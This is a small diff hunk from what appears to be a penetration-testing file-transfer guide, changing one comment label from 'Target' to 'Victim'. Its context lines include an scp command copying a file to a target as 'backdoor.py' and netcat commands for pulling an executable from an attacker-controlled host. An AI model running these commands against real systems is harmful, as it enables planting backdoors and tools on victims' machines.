@@ -191,7 +191,7 @@ scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
 # Attacker
 nc -l -p 4444 < /tool/file.exe
 
-# Target
+# Victim
 nc $ATTACKER 4444 > file.exe
 ```
 
